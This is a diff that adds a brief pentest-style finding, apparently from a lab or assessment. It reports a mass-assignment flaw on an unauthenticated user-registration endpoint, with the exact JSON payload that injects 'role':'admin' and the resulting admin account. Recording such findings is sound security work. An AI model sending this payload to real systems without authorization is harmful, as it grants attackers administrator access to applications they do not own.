@@ -1,0 +1,20 @@
+Mass Assignment / Privilege Escalation
+Endpoint:
+POST /api/Users/
+Authentication:
+Not required
+Test payload:
+{"email":"massassignment-test-2026@example.com","password":"MassTest123!","passwordRepeat":"MassTest123!","securityQuestion":{"id":1,"answer":"test"},"role":"admin"}
+Result:
+HTTP 201 Created
+Created account:
+User ID: 26
+Email: massassignment-test-2026@example.com
+Role: admin
+Impact:
+An unauthenticated attacker can supply the restricted "role"
+property during account creation and create an administrator account.
+This demonstrates privilege escalation through mass assignment.
+Classification:
+Confirmed vulnerability.
+Severity: Critical (provisional).
